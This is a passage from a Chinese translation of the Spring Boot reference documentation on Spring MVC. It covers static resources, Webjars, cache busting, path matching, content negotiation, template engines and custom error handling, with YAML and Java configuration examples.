<p>Spring MVC 有一种生成错误代码的策略，用于从绑定错误中渲染错误信息： <code>MessageCodesResolver</code>. 如果您设置了 <code>spring.mvc.message-codes-resolver-format</code> 属性等于 <code>PREFIX_ERROR_CODE</code> 或 <code>POSTFIX_ERROR_CODE</code>，Spring Boot 就会为您创建一个（参见 <a href="https://docs.spring.io/spring-framework/docs/6.1.1/javadoc-api/org/springframework/validation/DefaultMessageCodesResolver.Format.html" rel="nofollow">DefaultMessageCodesResolver.Format</a> 中的枚举）。</p> 
<h5><a id="_155"></a>静态内容</h5> 
<p>默认情况下，Spring Boot 会从类路径中名为 <code>/static</code>（或 <code>/public</code>、<code>/resources</code> 或 <code>/META-INF/resources</code>）的目录或 <code>ServletContext</code> 的根目录提供静态内容。它使用 Spring MVC 中的 <code>ResourceHttpRequestHandler</code>，因此您可以通过添加自己的 <code>WebMvcConfigurer</code> 并覆盖 <code>addResourceHandlers</code> 方法来修改该行为。<br> 在独立网络应用程序中，容器中的默认 servlet 未启用。可以使用 <code>server.servlet.register-default-servlet</code> 属性启用它。<br> 默认 servlet 充当后备角色，如果 Spring 决定不处理请求，它将从 <code>ServletContext</code> 的根中提供内容。大多数情况下，这种情况不会发生（除非你修改了默认 MVC 配置），因为 Spring 总是可以通过 <code>DispatcherServlet</code> 处理请求。<br> 默认情况下，资源映射到 <code>/**</code>，但可以使用 <code>spring.mvc.static-path-pattern</code> 属性进行调整。例如，将所有资源重新定位到 <code>/resources/**</code> 可按如下方式实现：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">mvc</span><span class="token punctuation">:</span>
    <span class="token key atrule">static-path-pattern</span><span class="token punctuation">:</span> <span class="token string">"/resources/**"</span>
</code></pre> 
<p>您还可以使用 <code>spring.web.resources.static-locations</code> 属性自定义静态资源位置（用目录位置列表替换默认值）。servlet 上下文根路径<code>"/"</code>也会自动添加为位置。<br> 除了前面提到的 “标准” 静态资源位置外，<a href="https://www.webjars.org/" rel="nofollow">Webjars 内容</a>还有一个特殊情况。默认情况下，任何路径为 <code>/webjars/**</code> 的资源，如果是以 Webjars 格式打包的，都是通过 jar 文件提供的。可以使用 <code>spring.mvc.webjars-path-pattern</code> 属性自定义路径。</p> 
<blockquote> 
 <p>如果应用程序打包为 jar，请勿使用 <code>src/main/webapp</code> 目录。虽然该目录是一个通用标准，但它只适用于 war 包，如果生成 jar，大多数构建工具都会忽略它。</p> 
</blockquote> 
<p>Spring Boot 还支持 Spring MVC 提供的高级资源处理功能，允许使用缓存破坏静态资源或为 Webjar 使用版本无关 URL 等用例。<br> 要为 Webjar 使用版本无关的 URL，请添加 <code>webjars-locator-core</code> 依赖项。然后声明你的 Webjar。以 jQuery 为例，添加<code>"/webjars/jquery/jquery.min.js"</code>的结果是<code>"/webjars/jquery/x.y.z/jquery.min.js"</code>，其中 <code>x.y.z</code> 是 Webjar 的版本。</p> 
<blockquote> 
 <p>如果使用 JBoss，则需要声明 <code>webjars-locator-jboss-vfs</code> 依赖关系，而不是 <code>webjars-locator-core</code>。否则，所有 Webjars 都会解析为 <code>404</code>。</p> 
</blockquote> 
<p>要使用缓存消除，以下配置将为所有静态资源配置缓存消除解决方案，有效地在 URL 中添加内容哈希，如 <code>&lt;link href="/css/spring-2a2d595e6ed9a0b24f027f2b63b134d6.css"/&gt;</code> ：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">web</span><span class="token punctuation">:</span>
    <span class="token key atrule">resources</span><span class="token punctuation">:</span>
      <span class="token key atrule">chain</span><span class="token punctuation">:</span>
        <span class="token key atrule">strategy</span><span class="token punctuation">:</span>
          <span class="token key atrule">content</span><span class="token punctuation">:</span>
            <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
            <span class="token key atrule">paths</span><span class="token punctuation">:</span> <span class="token string">"/**"</span>
</code></pre> 
<p>由于 Thymeleaf 和 FreeMarker 自动配置了 <code>ResourceUrlEncodingFilter</code>，资源链接在运行时会在模板中重写。使用 JSP 时，应手动声明此过滤器。其他模板引擎目前不自动支持，但可以通过自定义macros/helpers和使用 <a href="https://docs.spring.io/spring-framework/docs/6.1.1/javadoc-api/org/springframework/web/servlet/resource/ResourceUrlProvider.html" rel="nofollow">ResourceUrlProvider</a> 来支持。<br> 在使用 JavaScript 模块加载器等动态加载资源时，重命名文件是不可行的。因此，我们还支持其他策略，并可将其结合使用。<code>"fixed"</code> 策略会在 URL 中添加一个静态版本字符串，而不会更改文件名，如下例所示：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">web</span><span class="token punctuation">:</span>
    <span class="token key atrule">resources</span><span class="token punctuation">:</span>
      <span class="token key atrule">chain</span><span class="token punctuation">:</span>
        <span class="token key atrule">strategy</span><span class="token punctuation">:</span>
          <span class="token key atrule">content</span><span class="token punctuation">:</span>
            <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
            <span class="token key atrule">paths</span><span class="token punctuation">:</span> <span class="token string">"/**"</span>
          <span class="token key atrule">fixed</span><span class="token punctuation">:</span>
            <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
            <span class="token key atrule">paths</span><span class="token punctuation">:</span> <span class="token string">"/js/lib/"</span>
            <span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">"v12"</span>
</code></pre> 
<p>使用此配置后，位于<code>"/js/lib/"</code>下的 JavaScript 模块将使用固定的版本管理策略（<code>"/v12/js/lib/mymodule.js"</code>），而其他资源仍使用内容管理策略（<code>&lt;link href="/css/spring-2a2d595e6ed9a0b24f027f2b63b134d6.css"/&gt;</code>）。<br> 有关更多支持选项，请参阅 <a href="https://github.com/spring-projects/spring-boot/tree/v3.2.0/spring-boot-project/spring-boot-autoconfigure/src/main/java/org/springframework/boot/autoconfigure/web/WebProperties.java">WebProperties.Resources</a>。</p> 
<blockquote> 
 <p>Spring Framework 的<a href="https://docs.spring.io/spring-framework/reference/6.1/web/webmvc/mvc-config/static-resources.html" rel="nofollow">参考文档</a>和一篇专门的<a href="https://spring.io/blog/2014/07/24/spring-framework-4-1-handling-static-web-resources" rel="nofollow">博文</a>对这一功能进行了详细描述。</p> 
</blockquote> 
<h5><a id="_204"></a>欢迎页面</h5> 
<p>Spring Boot 支持静态和模板化欢迎页面。它首先在配置的静态内容位置查找 <code>index.html</code> 文件。如果找不到，它就会查找索引模板。如果找到其中之一，它将自动用作应用程序的欢迎页面。<br> 这仅作为应用程序定义的实际索引路由的备用。排序由 <code>HandlerMapping</code> Bean 的顺序定义，默认情况下如下：</p> 
<table><thead><tr><th><code>RouterFunctionMapping</code></th><th>使用 <code>RouterFunction</code> Bean 声明的端点</th></tr></thead><tbody><tr><td><code>RequestMappingHandlerMapping</code></td><td>在 <code>@Controller</code> Bean 中声明的端点</td></tr><tr><td><code>WelcomePageHandlerMapping</code></td><td>欢迎页面支持</td></tr></tbody></table> 
<h5><a id="_213"></a>自定义图标</h5> 
<p>与其他静态资源一样，Spring Boot 会检查配置的静态内容位置中是否有 <code>favicon.ico</code>。如果存在这样的文件，就会自动将其用作应用程序的图标。</p> 
<h5><a id="_215"></a>路径匹配和内容协商</h5> 
<p>Spring MVC 可以通过查看请求路径并将其与应用程序中定义的映射（例如控制器方法上的 <code>@GetMapping</code> 注解）进行匹配，从而将传入的 HTTP 请求映射到处理程序。<br> Spring Boot 选择默认禁用后缀模式匹配，这意味着 <code>"GET /projects/spring-boot.json"</code> 之类的请求不会匹配到 <code>@GetMapping("/projects/spring-boot")</code> 映射。这被视为 <a href="https://docs.spring.io/spring-framework/reference/6.1/web/webmvc/mvc-controller/ann-requestmapping.html#mvc-ann-requestmapping-suffix-pattern-match" rel="nofollow">Spring MVC 应用程序的最佳实践</a>。这一功能在过去主要适用于不发送正确 “Accept” 请求头的 HTTP 客户端；我们需要确保向客户端发送正确的内容类型。如今，内容协商功能更加可靠。<br> 我们还有其他方法来处理那些不能持续发送正确的 “Accept” 请求头的 HTTP 客户端。我们可以不使用后缀匹配，而是使用查询参数来确保类似 <code>"GET /projects/spring-boot?format=json"</code> 的请求会被映射到 <code>@GetMapping("/projects/spring-boot")</code>：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">mvc</span><span class="token punctuation">:</span>
    <span class="token key atrule">contentnegotiation</span><span class="token punctuation">:</span>
      <span class="token key atrule">favor-parameter</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
</code></pre> 
<p>或者，如果您希望使用不同的参数名称：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">mvc</span><span class="token punctuation">:</span>
    <span class="token key atrule">contentnegotiation</span><span class="token punctuation">:</span>
      <span class="token key atrule">favor-parameter</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
      <span class="token key atrule">parameter-name</span><span class="token punctuation">:</span> <span class="token string">"myparam"</span>
</code></pre> 
<p>开箱即支持大多数标准媒体类型，但您也可以定义新的媒体类型：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">mvc</span><span class="token punctuation">:</span>
    <span class="token key atrule">contentnegotiation</span><span class="token punctuation">:</span>
      <span class="token key atrule">media-types</span><span class="token punctuation">:</span>
        <span class="token key atrule">markdown</span><span class="token punctuation">:</span> <span class="token string">"text/markdown"</span>
</code></pre> 
<p>从 Spring Framework 5.3 开始，Spring MVC 支持两种将请求路径匹配到控制器的策略。默认情况下，Spring Boot 使用 <code>PathPatternParser</code> 策略。<code>PathPatternParser</code> 是一种优化的实现，但与 <code>AntPathMatcher</code> 策略相比有一些限制。<code>PathPatternParser</code> 限制使用某些路径模式变体。此外，它还与使用路径前缀（<code>spring.mvc.servlet.path</code>）配置 <code>DispatcherServlet</code> 不兼容。<br> 可以使用 <code>spring.mvc.pathmatch.matching-strategy</code> 配置属性来配置策略，如下例所示：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">mvc</span><span class="token punctuation">:</span>
    <span class="token key atrule">pathmatch</span><span class="token punctuation">:</span>
      <span class="token key atrule">matching-strategy</span><span class="token punctuation">:</span> <span class="token string">"ant-path-matcher"</span>
</code></pre> 
<p>默认情况下，如果找不到请求的处理程序，Spring MVC 将发送 404 Not Found 错误响应。若要抛出 <code>NoHandlerFoundException</code>，请将 <code>configprop:spring.mvc.throw-exception-if-no-handler-found</code> 设为 <code>true</code>。请注意，默认情况下，静态内容的服务会映射到 <code>/**</code>，因此会为所有请求提供处理程序。要抛出 <code>NoHandlerFoundException</code>，还必须将 <code>spring.mvc.static-path-pattern</code> 设为更具体的值，如 <code>/resources/**</code>，或将 <code>spring.web.resources.add-mappings</code> 设为 <code>false</code>，以完全禁用静态内容服务。</p> 
<h5><a id="ConfigurableWebBindingInitializer_250"></a>ConfigurableWebBindingInitializer</h5> 
<p>Spring MVC 使用 <code>WebBindingInitializer</code> 为特定请求初始化 <code>WebDataBinder</code>。如果你创建了自己的 <code>ConfigurableWebBindingInitializer</code> <code>@Bean</code>，Spring Boot 就会自动配置 Spring MVC 以使用它。</p> 
<h5><a id="_252"></a>模板引擎</h5> 
<p>除了 REST 网络服务，您还可以使用 Spring MVC 来提供动态 HTML 内容。Spring MVC 支持多种模板技术，包括 Thymeleaf、FreeMarker 和 JSP。此外，许多其他模板引擎也包含自己的 Spring MVC 集成。<br> Spring Boot 包含对以下模板引擎的自动配置支持：</p> 
<ul><li><a href="https://freemarker.apache.org/docs/" rel="nofollow">FreeMarker</a></li><li><a href="https://docs.groovy-lang.org/docs/next/html/documentation/template-engines.html#_the_markuptemplateengine" rel="nofollow">Groovy</a></li><li><a href="https://www.thymeleaf.org/" rel="nofollow">Thymeleaf</a></li><li><a href="https://mustache.github.io/" rel="nofollow">Mustache</a></li></ul> 
<blockquote> 
 <p>如果可能，应避免使用 JSP。在嵌入式 servlet 容器中使用 JSP 时，有几个已知的限制。</p> 
</blockquote> 
<p>在默认配置下使用这些模板引擎之一时，模板会自动从 <code>src/main/resources/templates</code> 抓取。</p> 
<blockquote> 
 <p>根据运行应用程序的方式，集成开发环境可能会对类路径进行不同的排序。在 IDE 中通过主方法运行应用程序时，与使用 Maven 或 Gradle 或通过打包的 jar 运行应用程序时的排序不同。这可能导致 Spring Boot 无法找到预期的模板。如果遇到这个问题，可以在 IDE 中重新排列类路径，将模块的类和资源放在前面。</p> 
</blockquote> 
<h5><a id="_265"></a>错误处理</h5> 
<p>默认情况下，Spring Boot 会提供一个 <code>/error</code> 映射，以合理的方式处理所有错误，并在 servlet 容器中将其注册为 “全局” 错误页面。对于机器客户端，它会生成一个 JSON 响应，其中包含错误的详细信息、HTTP 状态和异常消息。对于浏览器客户端，会有一个 “whitelabel” 错误视图，以 HTML 格式显示相同的数据（要自定义该视图，可添加一个解析为<code>error</code>的<code>View</code>）。<br> 如果要自定义默认错误处理行为，可以设置一些 <code>server.error</code> 属性。请参阅附录中的 "<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/application-properties.html#appendix.application-properties.server" rel="nofollow">服务器属性</a>"部分。<br> 要完全替换默认行为，您可以实现 <code>ErrorController</code> 并注册该类型的 Bean 定义，或者添加 <code>ErrorAttributes</code> 类型的 Bean 来使用现有机制但替换内容。</p> 
<blockquote> 
 <p><code>BasicErrorController</code> 可用作自定义 <code>ErrorController</code> 的基类。如果您想为一种新的内容类型添加一个处理程序（默认情况是专门处理 <code>text/html</code>，并为其他所有类型提供回退），这将特别有用。为此，请扩展 <code>BasicErrorController</code>，添加一个带有 <code>produces</code> 属性的 <code>@RequestMapping</code> 的公共方法，并创建一个新类型的 Bean。</p> 
</blockquote> 
<p>Spring Framework 6.0 支持 <a href="https://docs.spring.io/spring-framework/reference/6.1/web/webmvc/mvc-ann-rest-exceptions.html" rel="nofollow">RFC 7807 Problem Details</a>。Spring MVC 可以使用 <code>application/problem+json</code> 媒体类型生成自定义错误信息，如：</p> 
<pre><code class="prism language-json"><span class="token punctuation">{<!-- --></span>
  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"https://example.org/problems/unknown-project"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"title"</span><span class="token operator">:</span> <span class="token string">"Unknown project"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"status"</span><span class="token operator">:</span> <span class="token number">404</span><span class="token punctuation">,</span>
  <span class="token string-property property">"detail"</span><span class="token operator">:</span> <span class="token string">"No project found for id 'spring-unknown'"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"instance"</span><span class="token operator">:</span> <span class="token string">"/projects/spring-unknown"</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>可通过将 <code>spring.mvc.problemdetails.enabled</code> 设置为 <code>true</code> 来启用此支持。<br> 您还可以定义一个注释为 <code>@ControllerAdvice</code> 的类，以自定义针对特定控制器和/或异常类型返回的 JSON 文档，如下例所示：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">RequestDispatcher</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpStatus</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">ResponseEntity</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ControllerAdvice</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ExceptionHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseEntityExceptionHandler</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@ControllerAdvice</span><span class="token punctuation">(</span>basePackageClasses <span class="token operator">=</span> <span class="token class-name">SomeController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyControllerAdvice</span> <span class="token keyword">extends</span> <span class="token class-name">ResponseEntityExceptionHandler</span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@ResponseBody</span>
    <span class="token annotation punctuation">@ExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">MyException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">ResponseEntity</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> <span class="token function">handleControllerException</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">Throwable</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">HttpStatus</span> status <span class="token operator">=</span> <span class="token function">getStatus</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResponseEntity</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyErrorBody</span><span class="token punctuation">(</span>status<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ex<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> status<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token class-name">HttpStatus</span> <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">Integer</span> code <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">)</span> request<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token class-name">RequestDispatcher</span><span class="token punctuation">.</span><span class="token constant">ERROR_STATUS_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HttpStatus</span> status <span class="token operator">=</span> <span class="token class-name">HttpStatus</span><span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>status <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">?</span> status <span class="token operator">:</span> <span class="token class-name">HttpStatus</span><span class="token punctuation">.</span><span class="token constant">INTERNAL_SERVER_ERROR</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<p>在前面的示例中，如果 <code>MyException</code> 是由与 <code>SomeController</code> 定义在同一个包中的控制器抛出的，则会使用 <code>MyErrorBody</code> POJO 的 JSON 表示而不是 <code>ErrorAttributes</code> 表示。<br> 在某些情况下，<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.metrics.supported.spring-mvc" rel="nofollow">度量基础设施</a>不会记录控制器级处理的错误。应用程序可以通过将处理过的异常设置为请求属性，确保请求度量记录此类异常：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>error<span class="token punctuation">.</span></span><span class="token class-name">ErrorAttributes</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ExceptionHandler</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Controller</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyController</span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@ExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">CustomException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
    <span class="token class-name">String</span> <span class="token function">handleCustomException</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">CustomException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token class-name">ErrorAttributes</span><span class="token punctuation">.</span><span class="token constant">ERROR_ATTRIBUTE</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"errorView"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<h6><a id="_332"></a>自定义错误页面</h6> 
<p>如果要为给定的状态代码显示自定义 HTML 错误页面，可以在 <code>/error</code> 目录中添加文件。错误页面既可以是静态 HTML（即添加到任何静态资源目录下），也可以使用模板创建。文件名应为准确的状态代码或系列掩码。<br> 例如，要将 <code>404</code> 映射到静态 HTML 文件，目录结构如下：</p> 
<pre><code>src/
 +- main/
     +- java/
     |   + &lt;source code&gt;
     +- resources/
         +- public/
             +- error/
             |   +- 404.html
             +- &lt;other public assets&gt;
</code></pre> 
<p>要使用 FreeMarker 模板映射所有 <code>5xx</code> 错误，您的目录结构如下：</p> 
<pre><code>src/
 +- main/
     +- java/
     |   + &lt;source code&gt;
     +- resources/
         +- templates/
             +- error/
             |   +- 5xx.ftlh
             +- &lt;other templates&gt;
</code></pre> 
<p>对于更复杂的映射，您还可以添加实现 <code>ErrorViewResolver</code> 接口的 Bean，如下例所示：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>error<span class="token punctuation">.</span></span><span class="token class-name">ErrorViewResolver</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpStatus</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ModelAndView</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyErrorViewResolver</span> <span class="token keyword">implements</span> <span class="token class-name">ErrorViewResolver</span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">ModelAndView</span> <span class="token function">resolveErrorView</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpStatus</span> status<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> model<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// Use the request or status to optionally return a ModelAndView</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>status <span class="token operator">==</span> <span class="token class-name">HttpStatus</span><span class="token punctuation">.</span><span class="token constant">INSUFFICIENT_STORAGE</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token comment">// We could add custom model values here</span>
            <span class="token keyword">new</span> <span class="token class-name">ModelAndView</span><span class="token punctuation">(</span><span class="token string">"myview"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<p>您还可以使用 Spring MVC 的常规功能，如 <a href="https://docs.spring.io/spring-framework/reference/6.1/web/webmvc/mvc-servlet/exceptionhandlers.html" rel="nofollow">@ExceptionHandler 方法</a>和 <a href="https://docs.spring.io/spring-framework/reference/6.1/web/webmvc/mvc-controller/ann-advice.html" rel="nofollow">@ControllerAdvice</a> 等。然后，<code>ErrorController</code> 会接收任何未处理的异常。</p> 
<h6><a id="_Spring_MVC__383"></a>在 Spring MVC 之外映射错误页面</h6> 
<p>对于不使用 Spring MVC 的应用程序，可以使用 <code>ErrorPageRegistrar</code> 接口直接注册 <code>ErrorPages</code>。这种抽象方法可直接与底层嵌入式 servlet 容器配合使用，即使没有 Spring MVC <code>DispatcherServlet</code> 也能正常工作。</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ErrorPage</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ErrorPageRegistrar</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ErrorPageRegistry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpStatus</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Configuration</span><span class="token punctuation">(</span>proxyBeanMethods <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyErrorPagesConfiguration</span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Bean</span>
    <span class="token keyword">public</span> <span class="token class-name">ErrorPageRegistrar</span> <span class="token function">errorPageRegistrar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
